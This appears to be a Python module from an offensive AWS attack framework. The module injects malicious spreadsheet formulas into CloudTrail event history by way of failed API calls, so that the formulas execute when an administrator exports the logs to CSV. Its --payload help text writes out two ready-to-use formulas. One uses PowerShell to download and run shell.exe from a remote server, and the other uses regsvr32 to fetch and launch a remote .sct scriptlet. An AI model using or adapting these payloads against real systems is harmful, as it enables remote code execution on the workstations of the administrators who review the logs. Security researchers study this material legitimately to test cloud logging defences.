#!/usr/bin/env python3

#'description': ''This module will attempt to create a CloudTrail trail with a malicious Microsoft Excel and/or Google Sheets formula as the name as well as try to create an EC2 instance with the formula as the image ID. This is because a failed call won\'t work correctly. The failed events will be logged to CloudTrail\'s "Event history" page, where the past 90 days of API calls are listed. The logs can be exported to a .csv file, which due to the way that CloudTrail displays/exports the "Affected Resources" column, the formula we supply as a payload will attempt to execute. Payloads exist for both Microsoft Excel and Google Sheets. My blog post for this specific module is here: https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/. Further reading can be found here: https://www.we45.com/2017/02/14/csv-injection-theres-devil-in-the-detail/ and here: http://georgemauer.net/2017/10/07/csv-injection.html',


import datetime
import argparse
import importlib
from botocore.exceptions import ClientError

target = ''

technique_info = {
    'blackbot_id': 'T1078.004',
    'external_id': '',
    'controller': 'cloudtrail__csv_injection',
    'services': ['CloudTrail'],
    'prerequisite_modules': [],
    'arguments_to_autocomplete': ['--regions', '--payload'],
    'version': '1',
    'aws_namespaces': [],
    'last_updated_by': 'Blackbot, Inc. Sun Sep 20 04:13:33 UTC 2020' ,
    'ttp_exec': '',
    'ttp_mitigation': '',
    'ttp_detection': '',
    'name': 'NAME_HERE' ,
    'intent': 'Inject malicious formulas/data into CloudTrail event history.',

}

parser = argparse.ArgumentParser(add_help=False, description=technique_info['name'])

parser.add_argument('--regions', required=False, help='A comma-separated list of regions to target. The default is every region.')
parser.add_argument('--payload', required=True, help='The formula payload to use. Some examples:\n This formula uses PowerShell to contact an external server to download and execute a binary file: =cmd|\' /C powershell Invoke-WebRequest "http://your-server.com/test.exe" -OutFile "$env:Temp\\shell.exe"; Start-Process "$env:Temp\\shell.exe"\'!A1\nThis formula contacts a remote server to download and execute a .sct file: =MSEXCEL|\'\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u /i:http://your-server.com/SCTLauncher.sct scrobj.dll\'!\'\'')


def main(args, awsattack_main):
    args = parser.parse_args(args)

    import_path = 'ttp.src.cloudtrail_csv_injection_src'
    src_code = __import__(import_path, globals(), locals(), ['technique_info'], 0)
    importlib.reload(src_code)

    awsattack_main.chain = True
    return src_code.main(args, awsattack_main)

def summary(data, awsattack_main):
    out = '  {} CloudTrail regions(s) successfully attacked.\n'.format(data['success'])
    out += '  {} CloudTrail regions(s) failed to be attacked.\n'.format(data['fails'])
    return out
